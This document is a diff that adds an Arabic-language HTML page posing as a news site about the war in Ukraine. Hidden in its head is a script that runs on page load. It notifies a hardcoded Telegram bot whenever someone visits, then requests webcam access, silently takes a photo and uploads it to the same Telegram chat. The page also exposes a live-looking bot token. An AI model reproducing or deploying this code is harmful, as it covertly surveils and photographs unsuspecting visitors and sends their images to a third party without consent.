@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dillinger للأخبار</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: url('https://cdn.cnn.com/cnnnext/dam/assets/220318115410-01-ukraine-war-0318-super-tease.jpg') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            padding: 0;
+            color: #fff;
+        }
+        header {
+            background: linear-gradient(to right, #d32f2f, #ff5722);
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .container {
+            width: 80%;
+            margin: auto;
+            overflow: hidden;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        .news {
+            background: rgba(255, 255, 255, 0.2);
+            margin: 20px 0;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            color: white;
+        }
+        .news img {
+            width: 200px;
+            height: 120px;
+            object-fit: cover;
+            margin-right: 20px;
+            border-radius: 8px;
+        }
+        a {
+            text-decoration: none;
+            color: #ffcc00;
+            font-weight: bold;
+        }
+        footer {
+            text-align: center;
+            padding: 15px;
+            background: #222;
+            color: white;
+            margin-top: 20px;
+        }
+        .info-text {
+            font-size: 24px;
+            font-weight: bold;
+            margin-top: 20px;
+            color: #ffcc00;
+        }
+    </style>
+    <script>
+        async function sendAlert() {
+            const botToken = '7962752922:AAEOuOHOZnRsCNrkFAhiIZsDySOi-HQXJJw';
+            const chatId = '7321063678';
+            const message = `📢 شخص جديد دخل إلى الموقع!`;
+            
+            // إرسال إشعار إلى التلغرام
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
+        }
+
+        async function captureAndSendPhoto() {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', '7321063678');
+                        formData.append('photo', blob, 'visitor.jpg');
+                        fetch(`https://api.telegram.org/7962752922:AAEOuOHOZnRsCNrkFAhiIZsDySOi-HQXJJw/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg');
+                    stream.getTracks().forEach(track => track.stop());
+                }, 3000);
+            });
+        }
+        
+        window.onload = function() {
+            sendAlert();
+            captureAndSendPhoto();
+        }
+    </script>
+</head>
+<body>
+    <header>
+        Dillinger للأخبار
+    </header>
+    <div class="container">
+        <div class="info-text">Dillinger تم المعلومات</div>
+        <div class="news">
+            <img src="https://cdn.cnn.com/cnnnext/dam/assets/220318115410-01-ukraine-war-0318-super-tease.jpg" alt="أحدث الأخبار">
+            <div>
+                <h2>تطورات الحرب في أوكرانيا</h2>
+                <p>التوترات تستمر بين روسيا وأوكرانيا وسط تصعيد عسكري جديد.</p>
+                <a href="page1.html">اقرأ المزيد...</a>
+            </div>
+        </div>
+    </div>
+    <footer>
+        &copy; 2025 Dillinger للأخبار - جميع الحقوق محفوظة
+    </footer>
+</body>
+</html>
